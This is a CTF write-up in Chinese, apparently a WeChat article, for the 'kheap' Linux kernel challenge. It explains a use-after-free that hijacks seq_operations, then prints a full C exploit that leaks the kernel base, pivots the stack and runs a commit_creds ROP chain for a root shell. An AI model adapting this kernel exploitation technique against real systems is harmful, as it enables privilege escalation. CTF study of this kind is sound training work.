---
title: 【PWN专场】公开赛wp｜kheap
url: https://mp.weixin.qq.com/s?__biz=MzI2OTUzMzg3Ng==&mid=2247501413&idx=3&sn=652b24d4dbe04cfe0b21b0893a97f246&chksm=eadc51beddabd8a8f7a70ddc45cfc5c39e4974a370d0c250c4dca1699200622db8f4d7739252&scene=58&subscene=0#rd
source: 胖哈勃
date: 2023-03-16
fetch_date: 2025-10-04T09:45:19.300861
---

# 【PWN专场】公开赛wp｜kheap

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/tzAD45OOV0YUnd2zZNoznWpqWSs6wictAsozh9eudYbUicbGgGUX1icnciaArkFTYkExZOuZZygAoK9UxMTfsAXibsQ/0?wx_fmt=jpeg)

# 【PWN专场】公开赛wp｜kheap

胖哈勃

## 1.题目名称

kheap

## 2.题目考点

seq\_operation结构体的劫持(UAF)

## 3.题目详细解题方法

![](https://mmbiz.qpic.cn/mmbiz_png/tzAD45OOV0YUnd2zZNoznWpqWSs6wictA0LtvEe1WfZOMicrqVxias9FktHHia7XibViaJiaN4L5O6HGz4Uugl2LZQ70g/640?wx_fmt=png)

劫持seq\_operations结构体，该结构体为一个函数虚表。而在read(seq,ptr,0);时会执行上文中的代码，劫持该结构体的指针就能劫持RIP。

而由于该调用处没有可用的函数指针，因此通过xchg eax,esp来进行栈劫持。

eax为劫持的gadget的低位，这个低位则会落入用户态的页表中。

通过该方法进行栈劫持，在用户态的段中部署ROP提权

gcc -o main main.c -static生成main文件，在将该文件传入qemu虚拟机中，执行该文件即可提权。

exp：

```
#include <stdio.h>#include <fcntl.h>#include <stdlib.h>#include <string.h>#include <stdint.h>#include <assert.h>#include <signal.h>#include <unistd.h>#include <syscall.h>#include <pthread.h>#include <poll.h>#include <linux/userfaultfd.h>#include <linux/fs.h>#include <sys/shm.h>#include <sys/msg.h>#include <sys/ipc.h>#include <sys/ioctl.h>#include <sys/types.h>#include <sys/stat.h>#include <sys/mman.h>#include <sys/socket.h>#include <sys/syscall.h>
#define PAGE_SIZE 0x1000
struct info{  uint64_t idx;  char *ptr;};
struct request{  char *ptr;  uint64_t len;};

int dev_fd;uint64_t user_cs,user_ss,user_eflag,user_rsp;
void save_state(){  asm(    "movq %%cs, %0;"    "movq %%ss, %1;"    "movq %%rsp, %3;"    "pushfq;"    "pop %2;"    : "=r"(user_cs),"=r"(user_ss),"=r"(user_eflag),"=r"(user_rsp)    :    : "memory"  );}
void new(uint64_t idx){  struct info arg={idx,NULL};  ioctl(dev_fd,0x10000,&arg);}
void delete(uint64_t idx){  struct info arg={idx,NULL};  ioctl(dev_fd,0x10001,&arg);}
void choose(uint64_t idx){  struct info arg={idx,NULL};  ioctl(dev_fd,0x10002,&arg);}
int seq_open(){  int seq;  if ((seq=open("/proc/self/stat",O_RDONLY))==-1)  {    puts("[X] Seq Open Error");    exit(0);  }  return seq;}
void get_shell(){  system("/bin/sh");  exit(0);}
int main(){  save_state();  dev_fd=open("/dev/kheap",O_RDWR);  if (dev_fd<0)  {    puts("[X] Device Open Error");    exit(0);  }
  uint64_t *buf=malloc(0x20); uint64_t *recv=malloc(0x20);    new(0);  choose(0);  delete(0);    int seq_fd=seq_open();    read(dev_fd,(char *)recv,0x20);    uint64_t kernel_base=recv[0]-0x33F980;  uint64_t prepare_kernel_cred=kernel_base+0xcebf0;  uint64_t commit_creds=kernel_base+0xce710;  uint64_t kpti_trampoline=kernel_base+0xc00fb0;  uint64_t seq_read=kernel_base+0x340560;  uint64_t pop_rdi=kernel_base+0x2517a;  uint64_t mov_rdi_rax=kernel_base+0x5982f4;  uint64_t gadget=kernel_base+0x94a10;    printf("[+] kernel_base: 0x%lx\n",kernel_base);  printf("[+] prepare_kernel_cred: 0x%lx\n",prepare_kernel_cred);  printf("[+] commit_creds: 0x%lx\n",commit_creds);    uint64_t *mmap_addr=mmap((void *)(gadget&0xFFFFF000),PAGE_SIZE,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_ANONYMOUS|MAP_SHARED,-1,0);  printf("[+] mmap_addr: 0x%lx\n",(uint64_t)mmap_addr);    uint64_t *ROP=(uint64_t *)(((char *)mmap_addr)+0xa10),i=0;  *(ROP+i++)=pop_rdi;  *(ROP+i++)=0;  *(ROP+i++)=prepare_kernel_cred;  *(ROP+i++)=commit_creds;  *(ROP+i++)=kpti_trampoline+22;  *(ROP+i++)=0;  *(ROP+i++)=0;  *(ROP+i++)=(uint64_t)get_shell;  *(ROP+i++)=user_cs;  *(ROP+i++)=user_eflag;  *(ROP+i++)=user_rsp;  *(ROP+i++)=user_ss;    memcpy(buf,recv,0x20);  buf[0]=(uint64_t)gadget;  write(dev_fd,(char *)buf,0x20);  read(seq_fd,NULL,1);
}
```

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/tzAD45OOV0Zeox6znrSz1afEGxbEQYE9Uiblseq8RKdMAwgx379AFER4mgvOuLATkHkicupFYGiaAhxkpE4rH32lQ/0?wx_fmt=png)

胖哈勃

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/tzAD45OOV0Zeox6znrSz1afEGxbEQYE9Uiblseq8RKdMAwgx379AFER4mgvOuLATkHkicupFYGiaAhxkpE4rH32lQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过